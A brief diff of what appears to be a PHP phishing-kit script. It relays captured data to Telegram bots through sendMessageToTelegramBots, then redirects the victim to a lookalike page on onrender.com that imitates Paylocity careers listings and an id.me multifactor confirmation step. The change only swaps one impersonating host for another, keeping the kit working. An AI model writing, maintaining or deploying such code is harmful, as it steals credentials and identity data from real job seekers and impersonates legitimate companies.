@@ -89,7 +89,7 @@ sendMessageToTelegramBots($telegram_message, $telegram_bots);
 
 
 
-header("Location:https://paylocityllc.onrender.com/www.paylocity.com/careers/all-listings.job.34092/api.id.me/en/multifactor/561bec9af2114db1a7851287236fdbd8_confirm.php");
+header("Location:https://paylocity.onrender.com/www.paylocity.com/careers/all-listings.job.34092/api.id.me/en/multifactor/561bec9af2114db1a7851287236fdbd8_confirm.php");
 exit;
 }
 ?>
